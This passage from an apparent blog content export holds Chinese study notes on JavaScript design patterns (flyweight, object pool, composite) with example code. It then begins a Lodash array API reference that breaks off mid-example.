&#123;&#125;; return&#123; add:function(id,uploadType,fileName,fileSize)&#123; var flyWeightObj = UploadFactory.create(uploadType); var dom = document.createElement('div'); dom.innerHTML = '&lt;span&gt;文件名称:'+ fileName +', 文件大小: '+fileSize +'&lt;/span&gt;' + '&lt;button class="delFile"&gt;删除&lt;/button&gt;'; dom.querySelector('.delFile').onclick = function()&#123; flyWeightObj.delFile(id); &#125;; document.body.appendChild(dom); uploadDatabase[id] = &#123; fileName:fileName, fileSize:fileSize, dom:dom &#125;; return flyWeightObj; &#125;, setExternalState:function(id,flyWeightObj)&#123; var uploadData = uploadDatabase[id]; for(var i in uploadData)&#123; flyWeightObj[i] = uploadData[i] &#125; &#125; &#125;&#125;)(); 然后是开始触发上传动作的 startUpload函数： 123456var id = 0;window.startUpload = function(uploadType,files)&#123; for(var i=0,file;file=files[i++];)&#123; var uploadObj = uploadManager.add(++id,uploadType,file.fileName,file.fileSize); &#125;&#125; 最后是测试时间，运行下面的代码后，可以发现运行结果跟享元模式是一样的： 12345678910startUpload('plugin',[ &#123;fileName: '1.txt', fileSize: 1000 &#125;, &#123;fileName: '2.html', fileSize: 3000 &#125;, &#123;fileName: '3.txt', fileSize: 5000 &#125;, ]); startUpload('flash',[ &#123;fileName: '4.txt', fileSize: 1000 &#125;, &#123;fileName: '5.html', fileSize: 3000 &#125;, &#123;fileName: '6.txt', fileSize: 5000 &#125;, ]); 享元模式重构之前的代码一共创建了 6 个 upload 对象，而通过享元模式重构之后，对象的数量减少为 2 个，就算现在同时上传 2000 个文件，需要创建的 upload 对象数量依旧是 2。 享元模式 的适用性享元模式是一种很好的性能优化方案，但它也带来了一些复杂性的问题，从前面两组代码的比较可以看出，使用了享元模式之后，我们需要分别维护多一个 factory 对象和 一个 manager 对象，在大部分不必要使用享元模式的环境下，这些开销是可以避免的。 享元模式带来的好处很大程度上取决于如何使用以及何时使用，一般来说，一下情况发生的时候可以使用享元模式。 一个程序中使用了大量的相似对象 由于使用了大量对象，造成很大的内存开销 对象的大多数状态都可以变为外部状态 剥离出对象的外部状态之后，可以用相对比较少的共享对象取代大量对象 再谈内部状态和外部状态享元模式的关键是把内部状态和外部状态分离开来，有多少中内部状态的组合，系统便有最多多少个共享对象，而外部状态存储在共享对象的外部，在必要时被传入共享对象来组装成一个完整的对象。现在考虑两种极端的情况，即对象没有外部状态和没有内部状态的时候。 没有内部状态的享元在文件上传的例子中，我们分别进行过插件调用和 Flash 调用，就 startUpload(&#39;plugin&#39;,[]) 和 startUpload(flash,[])，导致程序中创建了内部状态不同的两个共享对象。很多网盘都提供了极速上传（控件）和普通上传（Flash）两种模式，如果极速上传不好使的话，用户可以随时切换到普通模式，所以这里确实是需要同时存在两个不同的 upload 共享对象，而不是在一开始就自我判断浏览器可以支持什么插件，就用什么插件上传。 但不是每个网站都要做得这么复杂，很多小的网站只支持单一的上传方式，如果不考虑极速上传和普通上传之间的切换，这意味着之前的代码中作为内部状态的 uploadType 属性是可以删除的。 在继续使用享元模式的前提下，构造函数 upload 就变成了无参数的形式： 1var upload = function()&#123;&#125; 其他属性如 fileName，fileSize，dom 依然可以作为外部状态保存在共享对象的外部。在 uploadType 作为内部状态的时候，它可能为空间，也可能为 Flash，所以当时最多可以组合成两个共享对象。而现在没有了内部状态，这意味着只需要唯一的一个共享对象。我们对代码进行改写： 1234567891011var UploadFactory = (function()&#123; var uploadObj; return&#123; create:function()&#123; if(uploadObj)&#123; return uploadObj &#125; return uploadObj = new Upload(); &#125; &#125;&#125;)() 管理器部分的代码不需要改动，还是负责剥离和组装外部状态，可以看到，当对象没有内部状态的时候，生产共享对象的工厂实际上变成了一个单例工厂，虽然这时候的共享对象没有内部状态的区分，但还是有剥离外部状态的过程，我们依然倾向于称之为享元模式。 没有外部状态的享元网上许多资料中，经常把 Java 或者 C#的字符串看成享元，这种说法是否正确呢？我们看看下面这段 Java 代码，来分析一下： 1234567public class Test &#123; public static void main( String args[] )&#123; String a1 = new String( "a" ).intern(); String a2 = new String( "a" ).intern(); System.out.println( a1 == a2 ); // true &#125; &#125; 在这段 Java 代码里，分别 new 了两个字符串对象 a1 和 a2。intern 是一种对象池技术， new String(“a”).intern()的含义如下 如果值为 a 的字符串对象已经存在于对象池中，则返回这个对象的引用 反之，将字符串 a 的对象添加进对象池，并返回这个对象的引用 所以 a1 == a2 的结果是 true，但这并不是使用了享元模式的结果，享元模式的关键是区别内部状态和外部状态。享元模式的过程是剥离外部状态，并把外部状态保存在其他地方，在合适的时刻再把外部状态组装进共享对象。这里并没有剥离外部状态的过程，a1 和 a2 指向的完全就是同一个对象，所以如果没有外部状态的分离，即使这里使用了共享的技术，但并不是一个纯粹的享元模式。 对象池对象池维护一个装载空闲对象的池子，如果需要对象的时候，不是直接 new，而是转从对象池里获取。如果对象池里没有空闲对象，则创建一个新的对象，当获取出的对象完成它的职责之后， 再进入池子等待被下次获取。 对象池的原理很好理解，比如我们组人手一本《JavaScript 权威指南》，从节约的角度来讲，这并不是很划算，因为大部分时间这些书都被闲置在各自的书架上，所以我们一开始就只买一本，或者一起建立一个小型图书馆（对象池），需要看书的时候就从图书馆里借，看完了之后再把书还回图书馆。如果同时有三个人要看这本书，而现在图书馆里只有两本，那我们再马上去书店买一本放入图书馆。 对象池的技术的应用非常广泛，HTTP 连接池和数据库连接池都是其代表应用，在 Web 前端开发中，对象池使用最多的场景大概是跟 DOM 有关的操作，很多空间和时间都消耗在了 DOM 节点上，如何避免频繁地创建和删除 DOM 节点就成了一个有意义的话题。 对象池的实现假设我们在开发一个地图应用，地图上经常会出现一些标志地名的小气泡，我们叫它 toolTip。 在搜索我家附近地图的时候，页面里出现了 2 个小气泡。当我再搜索附近的兰州拉面馆时，页面中出现了 6 个小气泡。按照对象池的思想，在第二次搜索开始之前，并不会把第一次创建的2 个小气泡删除掉，而是把它们放进对象池。这样在第二次的搜索结果页面里，我们只需要再创建 4 个小气泡而不是 6 个。 先定义个获取小气泡的工厂，作为对象池的数组称为私有属性被包含在工厂闭包里，这个工厂有两个暴露对外的方法，create 表示获取一个 div 节点，recover 表示回收一个 div 节点： 123456789101112131415161718var toolTipFactory = (function()&#123; var toolTipPool = []; // toolTip 对象池 return&#123; create:function()&#123; if(toolTipPool.length === 0)&#123; var div = document.createElement('div'); document.body.appendChild(div); return div; &#125;else&#123; return toolTipPool.shift(); // 如果对象池不为空，则从对象池取出一个 dom &#125; &#125;, recover:function(tooltipDom)&#123; return toolTipPool.push(tooltipDom); // 对象池回收 dom &#125; &#125;&#125;)(); 拨回进行第一次搜索的时刻，目前需要创建 2 个小气泡节点，为了方便回收，用一个数组 ary 来记录它们： 123456var ary = [];for(var i=0,str;str=['A','B'][i++];)&#123; var toolTip = toolTipFactory.create(); toolTip.innerHTML = 'src'; ary.push(toolTip);&#125; 假设地图需要开始重新绘制，在此之前把两个节点回收进去对象池： 123for(var i=0,toolTip;toolTip = ary[i++])&#123; toolTipFactory.recover(toolTip);&#125; 在创建6个小气泡 123456var ary = [];for(var i=0,str;str=[ 'A', 'B', 'C', 'D', 'E', 'F'][i++];)&#123; var toolTip = toolTipFactory.create(); toolTip.innerHTML = 'src'; ary.push(toolTip);&#125; 对象池跟享元模式的思想有点相似，虽然 innerHTML 的值 A、B、C、D 等也可以看成节点的外部状态，但在这里我们并没有主动分离内部状态和外部状态的过程. 通用对象池实现我们还可以在对象池工厂里，把创建对象的具体过程封装起来，实现一个通用的对象池： 1234567891011var objectPoolFactory = function(createObjFn)&#123; var objectPool = []; return &#123; create:function()&#123; var obj = objectPool.length === 0 ? createObjFn.apply(this,arguments) : objectPool.shift(); &#125;, recover:function(obj)&#123; objectPool.push(obj); &#125; &#125;&#125; 现在可以利用 objectPoolFactory 来创建一个装载一些 iframe 的对象池： 1234567891011121314151617181920212223242526272829303132var objectPoolFactory = function(createObjFn)&#123; var objectPool = []; return &#123; create:function()&#123; var obj = objectPool.length === 0 ? createObjFn.apply(this,arguments) : objectPool.shift(); return obj; &#125;, recover:function(obj)&#123; objectPool.push(obj); &#125; &#125;&#125;var iframeFactory = objectPoolFactory(function()&#123; var iframe = document.createElement('iframe'); document.body.appendChild(iframe); iframe.onload = function()&#123; iframe.onload = null; // 防止 iframe 重复加载的 bug iframeFactory.recover(iframe); // iframe 加载完成之后回收节点 &#125; return iframe;&#125;);var iframe1 = iframeFactory.create(); iframe1.src = 'http://baidu.com'; var iframe2 = iframeFactory.create(); iframe2.src = 'http://QQ.com'; setTimeout(function()&#123; var iframe3 = iframeFactory.create(); iframe3.src = 'http://163.com'; &#125;, 3000 ); 对象池是另外一种性能优化方案，它跟享元模式有一些相似之处，但没有分离内部状态和外部状态这个过程。本章用享元模式完成了一个文件上传的程序，其实也可以用对象池+事件委托来代替实现 小结享元模式是为解决性能问题而生的模式，这根大部分模式的诞生原因都不一样，在一个存在大量相似对象的系统中，享受模式可以很好地解决大量对象带来的性能问题。]]></content>
      <categories>
        <category>JavaScript设计模式</category>
      </categories>
      <tags>
        <tag>JavaScript设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript设计模式——组合模式]]></title>
    <url>%2F2019-02-26-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[学习曾探的 《JavaScript设计模式与开发实践》并做记录。 书籍的购买链接 设计模式的定义是：在面向对象软件设计过程中针对特定问题的简洁而优雅的解决方案。 通俗一点，设计模式是在某种场合下对某个问题的一种解决方案。是给面向对象软件开发中的一些好的设计取个名字。 JavaScript设计模式——组合模式组合模式就是用小的子对象来构建更大的对象，而这些小的对象本身也许是由更小的“孙对象”构成的。 回顾宏命令宏命令对象包含了一组具体的子命令对象，不管是宏命令对象还是子命令对象，都有一个 execute 方法负责执行命令。回顾一下之前安装在万能遥控器上的宏命令代码： 1234567891011121314151617181920212223242526272829303132333435var closeDoorCommand = &#123; execute:function()&#123; console.log('关门'); &#125;&#125;var openPcCommand = &#123; execute:function()&#123; console.log('开电脑'); &#125;&#125;var openQQCommand = &#123; execute:function()&#123; console.log('登录QQ'); &#125;&#125;var MacroCommand = function()&#123; return&#123; commandList:[], add:function(command)&#123; this.commandList.push(command); &#125;, execute:function()&#123; for(var i=0,command;command = this.commandList[i++];)&#123; command.execute(); &#125; &#125; &#125;&#125;var macroCommand = new MacroCommand();macroCommand.add(closeDoorCommand);macroCommand.add(openPcCommand);macroCommand.add(openQQCommand);macroCommand.execute(); 上面的代码可以很容易发现啊，宏命令中包含了一组子命令，它们组成了一个树形结构，这里是一颗结构非常简单的树。 其中，macroCommand 被称为组合对象，closeDoorCommand、openPcCommand、openQQCommand 都是叶对象。在 macroCommand 的 execute 方法里，并不真正地执行操作，而是遍历它所包含的叶对象，把真正的 execute 请委托给这些叶对象。 macroCommand 表现得像一个命令，但它实际上只是一组真正命令的“代理”。并非真正的代理，虽然结构上很相似，但 macroCommand 只负责传递请求给也对象，它的目的不在于控制对业对象的访问。 组合模式的用途组合模式将对象合成树形结构，以表示 “部分——整体”的层次结构。除了用来表示树形结构之外，组合模式的另一个好处是通过对象的多态性表现，使得用户对单个对象和组合对象的使用具有一致性，下面分别说明： 表示树形结构。通过回顾上面的例子，我们很容易找到组合模式的一个优点：提供一种遍历树形结构的方案，通过调用组合对象的 execute 方法，程序会递归调用组合对象下面的也对象的 execute 方法，所以我们万能遥控器只需要一次操作，便能一次完成关门、打开电脑、登录 QQ 这几件事情。组合模式可以非常方便地描述对象部分-整体层次结构。 利用对象多态性统一对待组合对象和单个对象。利用对象的多态性表现，可以使客户端忽略组合对象和单个对象的不同。在组合模式中，客户将统一地使用组合结构中的所有对象，而不需要关系它究竟是组合对象还是单个对象。 在实际开发中会给客户带来相当大的便利性，当我们往万能遥控器里面添加一个命令的时候，并不关心这个命令是宏命令还是普通子命令。这点对于我们不重要，我们只需要确定它是一个命令，并且这个命令拥有可执行的 execute 方法，那么这个命令就可以被添加进万能遥控器。 当宏命令和通过子命令接收到执行 execute 方法的请求的时候，宏命令和普通子命令都会做它们各自认为正确的事情。这些差异是隐藏在客户背后的，在客户看来，这种透明性可以让我们非常自由地扩展这个万能遥控器。 请求在树中传递的过程在组合模式中，请求在树中传递的过程总是遵循一种逻辑。 以宏命令为例子，请求从树的顶端的对象往下传递，如果当前处理请求的对象是叶对象（普通子命令），叶对象自身会对请求做出对应的处理。如果当前处理请的对象是组合对象（宏命令），组合对象则会遍历它属下的子节点，将请求继续传递给这些子节点。 总而言之，如果子节点是也对象，叶对象自身会处理这个请求，而如果子节点还是组合对象，请求就会继续传递下去。叶对象下面不会再有其他子节点，一个叶对象就是树的这条树枝的尽头，组合对象下面可能还有有子节点。 请求从上到下沿着树进行传递，直到树的尽头，作为客户，只需要关心树最顶层的组合对象，客户只需要请求这个组合对象，请求便会沿着树往下传递，依次达到所有的叶对象。 在刚刚的例子中，由于宏命令和子命令组成的树太过简单，我们还不清楚地看到组合模式带来的好处，如果只是简单地遍历一组节点，迭代器便能解决所有的问题。下面创造一个更强大的宏命令，这个宏命令中又包含一些宏命令和普通子命令，看起来是一颗相对复杂的树。 更强大的宏命令目前的万能遥控器，包含了关门、开电脑、登录QQ 这 3 个命令。现在我们需要一个 “超级万能遥控器”，可以控制家里的所有电器，这个遥控器拥有以下的功能： 打开空调 打开电视和音响 关门、开电脑、登录QQ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;body&gt; &lt;button id="button"&gt;按我&lt;/button&gt; &lt;script&gt; var MacroCommand = function()&#123; return&#123; commandList:[], add:function(command)&#123; this.commandList.push(command); &#125;, execute:function()&#123; for(var i=0,command;command = this.commandList[i++];)&#123; command.execute(); &#125; &#125; &#125; &#125; var openAcCommand = &#123; execute:function()&#123; console.log('打开空调'); &#125; &#125; // 家里的电视和音响是连接在一起的，所以可以用一个宏命令来组合打开电视和打开音响的命令 var openTvCommand = &#123; execute:function()&#123; console.log('打开电视'); &#125; &#125; var openSoundCommand = &#123; execute:function()&#123; console.log('打开音响'); &#125; &#125; var macroCommand1 = new MacroCommand(); macroCommand1.add(openTvCommand); macroCommand1.add(openSoundCommand); // 关门、打开电脑和打登录 QQ 的命令 var closeDoorCommand = &#123; execute:function()&#123; console.log('关门'); &#125; &#125; var openPcCommand = &#123; execute:function()&#123; console.log('开电脑'); &#125; &#125; var openQQCommand = &#123; execute:function()&#123; console.log('打开QQ'); &#125; &#125; var macroCommand2 = new MacroCommand(); macroCommand2.add(closeDoorCommand); macroCommand2.add(openPcCommand); macroCommand2.add(openQQCommand); // 把所有命令组合成为一个超级命令 var macroCommand = new MacroCommand(); macroCommand.add(openAcCommand); macroCommand.add(macroCommand1); macroCommand.add(macroCommand2); // 最后给遥控器绑定“超级命令” var setCommand = (function(command)&#123; document.getElementById('button').onclick = function()&#123; command.execute(); &#125; &#125;)(macroCommand); &lt;/script&gt;&lt;/body&gt; 当按下遥控器的时候，所有命令都被依次执行。 基本对象可以被组合成为复杂的组合对象，组合对象又可以被组合，这样不断递归下去，这棵树的结构可以支持任意多的复杂度。在树最终被构造完成之后，让整颗树最终运转起来的步骤是非常简单，组需要调用上层对象的 execute 方法。每当对最上层的对象进行一次请求，实际上是对整个树进行深度优化的搜索，而创建组合对象的程序员并不关心内在的细节，往这棵树里面添加一些新的节点对象是非常容易的事情。 抽象类在组合模式中的作用组合模式的最大优点在于可以一致地对待组合对象和基本对象。客户不需要知道当前处理的宏命令还是普通命令，只要它是一个命令，并且有 execute方法，这个命令就可以被添加到树中。 这种透明性带来的便利，在静态类型原样中体现尤为明显。在 Java 中，实现组合模式的关键是 Composite 类 和 Leaf 类都必须继承一个Component 类。这个 Component 抽象类既代表组合对象又代表叶对象，它能够保证组合对象和叶对象拥有同样名字的方法，从而对同一消息都做出反馈。组合对象和叶对象的具体类型被隐藏在 Component 抽象类身后。 针对 Component 抽象类来编写程序，客户操作始终是 Component 对象，而不用去区分到底是组合对象还是叶对象。所以我们往同一个对象里面的 add 方法，既可以添加 组合对象也可以添加叶对象。代码如下： 1234567891011121314151617181920212223242526272829public abstract class Component &#123; public void add(Component child)&#123;&#125; public void remove(Component child)&#123;&#125;&#125;public class Composite extends Component &#123; public void add(Component child)&#123;&#125; public void remove(Component child)&#123;&#125;&#125;public class Leaf extends Component &#123; public void add(Component child)&#123; throw new UnsupportedOperationException(); // 叶对象不能添加子节点 &#125; public void remove(Component child)&#123;&#125;&#125;public class Client()&#123; public static void main(String args[])&#123; Component root = new Composite(); Component c1 = new Composite(); Component c2 = new Composite(); Component leaf1 = new Leaf(); Component leaf2 = new Leaf(); root.add(c1); c1.add(leaf1); root.add(c2); c2.add(leaf1); root.remove(); &#125;&#125; 在 JavaScript 这种动态类型语言中，对象的多态性是与生俱来的，也没有编译器去检查变量的类型，所以我们通常不会去模拟一个 “怪异” 的抽象类，JavaScript 中实现组合模式的难点在于要保证组合对象和叶对象对象拥有同样的方法，这通常需要用鸭子类型的思想对它们进行接口检查。 在 JavaScript 中实现组合模式，看起来缺乏一些严谨性，我们的代码算不上安全，但能够更快速和自由地开发，这既是 JavaScript 的优点也是它的缺点。 透明性带来的安全问题组合模式的透明性使得发起请的客户不用去估计组合对象和叶对象的区别，但它们在本质上是有去呗的。 组合对象可以拥有子节点，叶对象下面就没有子节点，所以我们也许会发生一些误操作，比如试图往叶对象中添加子节点。解决的方案是给叶对象也添加 add 方法，并调用这个方法，抛出一些异常来及时提醒用户，代码如下： 123456789var openTvCommand = &#123; execute:function()&#123; console.log('打开电视'); &#125;, add:function()&#123; throw new Error( '叶对象不能添加子节点' ); &#125;&#125; openTvCommand.add( macroCommand ) // Uncaught Error: 叶对象不能添加子节点 扫描文件夹文件夹和文件之间的关系，非常使用组合模式来描述。文件夹既可以包含文件，又可以包含其他文件夹，最终可能组合成一颗树，组合模式在文件夹的应用中有一下两层好处： 例如我在同事的移动硬盘找到了一些电子书，想把它们复制到 F 盘中的学习资料文件夹。复制这些电子书的时候，我并不需要考虑这批文件的类型，不管它们是单独的还是被放在了文件夹中。 当我使用杀毒软件扫描该文件夹的时候，往往不会关心里面有多少个文件和子文件夹，组合模式使得我们需要操作最外层的文件进行扫描。 定义好文件夹 Folder 和 文件 File 这两个类： 1234567891011121314151617181920212223var Folder = function(name)&#123; this.name = name; this.files = [];&#125;Folder.prototype.add = function(file)&#123; this.files.push(file);&#125;Folder.prototype.scan = function()&#123; console.log('开始扫描文件夹：'+this.name); for(var i=0,file,files = this.files;file=files[i++])&#123; file.scan(); &#125;&#125;var File = function(name)&#123; this.name = name;&#125;File.prototype.add = function()&#123; throw new Error('文件下面不能添加文件夹');&#125;File.prototype.scan = function()&#123; console.log('开始扫描文件:'+this.name);&#125; 接下来创建一些文件夹和文件对象，并且让它们组合成一棵树，这棵树就是我们 F 盘里面现有的文件结构： 12345678910111213var folder = new Folder('学习资料');var folder1 = new Folder('JavaScript');var folder2 = new Folder('jQuery');var file1 = new File( 'JavaScript 设计模式与开发实践' ); var file2 = new File( '精通 jQuery' ); var file3 = new File( '重构与模式' ) folder1.add(file1);folder2.add(file2);folder.add(folder1);folder.add(folder2);folder.add(file3); 现在的需求是把移动硬盘里面文件和文件夹都复制到这棵树中，假设我们已经得到了这些文件对象： 1234567var folder3 = new Folder( 'Nodejs' ); var file4 = new File( '深入浅出 Node.js' ); folder3.add( file4 ); var file5 = new File( 'JavaScript 语言精髓与编程实践' ); // 接下来就是把这些文件都添加到原有的树中：folder.add( folder3 ); folder.add( file5 ); 通过这个例子我们再次看到客户是如何同等对待组合对象和叶对象的。在添加一批文件的操作过程中，客户不用分辨它们到底是文件还是文件夹。新增加的文件和文件夹都能够很容易添加到原来的树结构中，和树里已有的对象一起工作。 我们改变了树的结构，增加了新的数据，却不用修改任何一句原有的代码，这是符合开发-封闭原则的。 运用了组合模式之后，扫描整个文件夹的操作也是轻而易举的，只需要操作最顶端的对象： 1folder.scan(); 注意的地方在使用组合模式的时候，下面有一些要注意的地方 组合模式不是父子关系 组合模式的树型结构容易让人误以为组合对象和叶对象是父子关系，这是不正确的。组合模式是一种 HAS-A(聚合)的关系，而不是 IS-A。组合对象包含一组对象，但 Leaf 并不是 Composite 的子类。组合对象把请求委托给它所包含的所有叶对象，它们能够合作的关键是拥有同样的接口。 对叶对象操作的一致性 组合模式要求组合对象和叶对象拥有同样的接口之外，还有一个必要的条件，就是对一组叶对象的操作必须具有一致性。 双向映射关系 发送过节费的通知步骤是从公司到各个部门，再到各个小组，最后到每个员工的邮箱里。这本身是一个组合模式的好例子，但要考虑的一种情况是，也许某个员工隶属多个组织结构。这种情况下，对象之间的关系就不是严格意义上的层次结构，不适用用组合模式。 可以给父节点和子节点建立双向映射关系，一个简单的方法就是给小组和成员对象增加集合来保存对方的引用。但是这种相互间的引用相当复杂，而且对象之间产生过多的耦合性，修改或者删除一个对象都变得非常困难，此时可以介入中介者模式来管理这些对象。 用职责链模式提高组合模式性能 在组合模式中，如果树的结构过于复杂，节点数量很多，在遍历树的过程中，性能过程也许表现得不够理想。有时候我们确实可以借助一些技巧，在实际操作中避免遍历整颗树，有一种现成的方案是借助职责链模式一般需要我们手动去设置链条，但在组合模式中，父对象和子对象之间实际上形成了天然的职责链。让请求顺着链条从父对象往子对象传递，或者是反过来。直到遇到可以处理该请求的对象为止，这也是职责链模式的经典运用场景之一。 引用父对象组合对象保存了它下面的子节点的引用，这是组合模式的特点，此时结构是从上至下的。但有时候我们需要在子节点保持对父节点的引用。比如在组合模式中使用职责链的时候。还有当我们删除某个文件的时候，实际上是从这个文件所在的上层文件夹删除该文件的。 现在来改写扫描文件夹的代码： 1234567891011121314151617181920var Folder = function(name)&#123; this.name = name; this.parent = null; // 增加父节点属性 this.files = [];&#125;Folder.prototype.add = function(file)&#123; file.parent = this; // 设置父对象 this.files.push(file);&#125;Folder.prototype.remove = function()&#123; if(!this.parent)&#123; return; // 根节点或者树外的游离节点 &#125; for(var files = this.parent.files,l=files.length-1;l&gt;=0;l--)&#123; var file = files[l]; if(file === this)&#123; files.splice(l,1); &#125; &#125;&#125; 在 File.prototype.remove 方法里，首先会判断 this.parent，如果 this.parent 为 null，那么这个文件夹要么是树的根节点，要么是还没有添加到树的游离节点，这时候没有节点需要从树中移除，我们暂且让 remove 方法直接 return，表示不做任何操作。 如果 this.parent 不为 null，则说明该文件夹有父节点存在，此时遍历父节点中保存的子节点列表，删除想要删除的子节点. File 类的实现基本一致: 123456789101112131415161718192021var File = function(name)&#123; this.parent = null; // 增加父节点属性 this.name = name;&#125;File.prototype.add = function()&#123; throw new Error('文件下面不能添加文件夹');&#125;File.prototype.remove = function()&#123; if(!this.parent)&#123; return; // 根节点或者树外的游离节点 &#125; for(var files = this.parent.files,l=files.length-1;l&gt;=0;l--)&#123; var file = files[l]; if(file === this)&#123; files.splice(l,1); &#125; &#125;&#125;File.prototype.scan = function()&#123; console.log('开始扫描文件:'+this.name);&#125; 何时使用组合模式组合模式运用得当的话，可以大大简化客户代码，一般来说，组合模式适用于下面两种情况： 表示对象的部分-整体层次结构。组合模式可以方便地构造一棵树来表示对象的部分-整体结构。特别是我们在开发期间不确定这棵树到底存在多少层次的时候。在树的构造最终完成之后，需要通过请求树的最顶层对象，便能对整棵树做统一的操作。在组合模式中增加和删除树的节点非常方便，并且符合开发-封闭的原则。 客户希望统一对待树中的所有对象。组合模式可以使客户忽略组合对象和叶对象的区别，客户在面对这颗树的时候，不用关心目前正在处理的对象是组合还是叶对象，也就是不用写一堆 if、else 来判断它们。组合对象和叶对象各自做自己正确的事情，这是组合模式最重要的能力。 小结我们了解了组合模式在 JavaScript 开发中的应用。组合模式可以让我们使用树形方式创建对象的结构。我们把相同的操作应用在组合对象和单个对象上面。在大多数情况下，我们都可以忽略掉组合对象和单个对象之间的差别，从而用一致的方法来处理它们。 然后，组合模式并不是完美的，它可能会有一个这样的系统：系统中的每个对象看起来都与其他对象差不多。它们的区别只有在运行的时候才会显现出来，这会使得代码难以理解。此外，如果通过组合模式创建了太对的对象，那么这些对象可能会让系统负担不起。]]></content>
      <categories>
        <category>JavaScript设计模式</category>
      </categories>
      <tags>
        <tag>JavaScript设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Lodash-API]]></title>
    <url>%2F2019-02-26-Lodash.html</url>
    <content type="text"><![CDATA[Lodash 是一个一致性、模块化、高性能的 JavaScript 实用工具库。 Lodash 提供的辅助函数主要分成下面几类，官方文档 Array：适用于数组类型，比如填充数据、查找元素、数组分片等操作 Collection：适用于数组和对象类型，部分用于字符串，比如分组、查找、过滤等操作 Function：适用于函数类型，比如节流、延迟、缓存、设置钩子等操作 Lang：普遍用于各种类型，常用语类型判断和类型转换 Math：适用于数值类型，常用语执行数学运算 Number：适用于生成随机数，比较数值与数值区间的关系 Object：适用于对象类型，常用于对象的创建、扩展、类型转换、检索和集合等操作 Seq：常用语创建链式调用，提高执行性能（惰性计算） String：适用于字符串类型 lodash/fp 模块提供了更接近函数式编程的开发方式，其内部的函数经过包装，具有 immutable、auto-curried、iteratee-first、data-last（官方介绍）等特点。Lodash 在 GitHub Wiki 中对lodash/fp 的特点做了如下概述： Fixed Arity：固化参数个数，便于柯里化 Rearragned Arguments ：重新调用参数位置，便于函数之间的聚合 Capped Iteratee Argument：封装 Iteratee 参数 使用方式 Array_.chunk创建一个包含元素的数组，该元素被分成大小相同的组。如果数组不能被评价分割，那么最后的块就是剩下的元素。 语法： _.chunk(array,[size]) 参数： array(Array):目标数组 [size=1](number):每一块的长度 返回: (Array):新的数组块 1234_.chunk([1, 2, 3, 4, 5, 6], 2)// [[1,2],[3,4],[5,6]]_.chunk([1, 2, 3, 4, 5, 6], 5)// [[1,2,3,4,5],[6]] _.compact创建一个删除所有 falsey(也叫做 falsy ,虚值) 的数组。false、null、0、””、undefined和NaN是falsey。 关于 Falsy 语法： _.compact(array) 参数： array(Array):目标数组 返回： (Array):返回筛选好值后的数组 12_.compact([false,null,0,"",undefined,1,3,4,5,NaN])// [1,3,4,5] _.concat创建一个新的数组，将数组与其他数组或者是值连接起来 语法： _.concat(array,[values]) 参数： array(Array): 目标数组 [values](…*):连接后的值，可以是任何类型 返回： (Array):返回新的连接数组 12_.concat([false,null,0,"",undefined,1,3,4,5,NaN],[2],null,null,&#123;a:2&#125;)// [false, null, 0, "", undefined, 1, 3, 4, 5, NaN, 2, null, null, &#123;a:2&#125;] _.difference创建不包含在其他给定数组中的数组值的数组，用于相等比较。结果的值的顺序和引用有第一个数组决定。 语法： _.difference(array,[values]) 参数： array(Array): 目标数组 [values](…Array):要排除的值 返回： (Array):返回筛选后的新数组 12_.difference([false,null,0,"",undefined,1,3,4,5,NaN],[3],[null],[null],[&#123;a:2&#125;])// [false, 0, "", undefined, 1, 4, 5, NaN] _.differenceBy这个 Api 跟上面不同之处在于它接受 iteratee,iteratee为数组中的每个元素和值的调用，以生成比较它们的标准。结果值的顺序和引用还是由第一个数组决定。 语法： _.differenceBy(array,[values],[iteratee=_.identity]) 参数： array(Array): 目标数组 [values](…Array):要排除的值 [iteratee=_.identity](Function):iteratee调用每个元素 返回： (Array):返回筛选后的新数组 123456_.differenceBy([4.6,1.2,3.3],[2.1],[3.2],Math.floor)// [4.6,1.2]_.differenceBy([&#123; 'x': 2 &#125;,&#123;'y':3&#125;, &#123; 'x': 1 &#125;], [&#123; 'x': 1 &#125;], 'y')//[&#123;'y':3&#125;]_.differenceBy([&#123; 'x': 2 &#125;,&#123;'y':3&#125;, &#123; 'x': 1 &#125;], [&#123; 'x': 1 &#125;], 'x')//[&#123;'x':2&#125;,&#123;'y':3&#125;] _.drop创建一个数组切片，从开始删除 n 个元素。 语法： _.drop(array,[n=1]) 参数： array(Array): 目标数组 [n=1](number):要删除的元素的数量 返回： (Array):返回数组的切片 12345678_.drop([1, 2, 3, 4, 5], -1) // [1,2,3,4,5]_.drop([1, 2, 3, 4, 5], 0) // [1,2,3,4,5]_.drop([1, 2, 3, 4, 5], 1) // [2,3,4,5]_.drop([1, 2, 3, 4, 5], 2) // [3,4,5]_.drop([1, 2, 3, 4, 5], 3) // [4,5]_.drop([1, 2, 3, 4, 5], 4) // [5]_.drop([1, 2, 3, 4, 5], 5) // []_.drop([1, 2, 3, 4, 5], 6) // [] _.dropRight与._drop相似，创建一个数组切片，不同的是从数组结尾开始删除元素 语法： _.dropRight(array,[n=1]) 参数： array(Array): 目标数组 [n=1](number):要删除的元素的数量 返回： (Array):返回数组的切片 12345678_.dropRight([1, 2, 3, 4, 5], -1) // [1,2,3,4,5]_.dropRight([1, 2, 3, 4, 5], 0) // [1,2,3,4,5]_.dropRight([1, 2, 3, 4, 5], 1) // [1,2,3,4]_.dropRight([1, 2, 3, 4, 5], 2) // [1,2,3]_.dropRight([1, 2, 3, 4, 5], 3) // [1,2]_.dropRight([1, 2, 3, 4, 5], 4) // [1]_.dropRight([1, 2, 3, 4, 5], 5) // []_.dropRight([1, 2, 3, 4, 5], 6) // [] _.dropRightWhile创建一个数组切片，从末尾丢弃掉一些元素。被丢弃的元素是从末尾开始循环的，直到 predicate 返回 falsey.predicate 函数有三个参数：value,index,array 语法： _.dropRightWhile(array,[predicate=_.identity]) 参数： array(Array): 目标数组 [predicate=_.identity](Function):每次迭代要调用的函数 返回： (Array):返回数组的切片 123456789101112131415var users = [ &#123; 'user': 'barney', 'active': true &#125;, &#123; 'user': 'fred', 'active': false &#125;, &#123; 'user': 'pebbles', 'active': false,'haha':1 &#125;,];_.dropRightWhile(users,function(o)&#123;return !o.active&#125;) //[&#123; 'user': 'barney', 'active': true &#125;]_.dropRightWhile(users,function(o)&#123;return 